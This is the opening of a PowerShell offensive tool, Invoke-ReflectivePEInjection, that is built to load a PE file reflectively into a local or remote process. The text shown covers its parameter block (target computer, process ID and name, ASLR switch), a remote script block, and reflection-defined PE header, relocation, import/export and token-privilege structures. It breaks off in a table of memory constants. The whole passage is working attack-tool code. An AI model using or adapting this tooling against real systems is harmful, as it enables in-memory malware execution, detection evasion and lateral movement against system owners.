function Invoke-ReflectivePEInjection
{

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
    [Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $true)]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)
Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
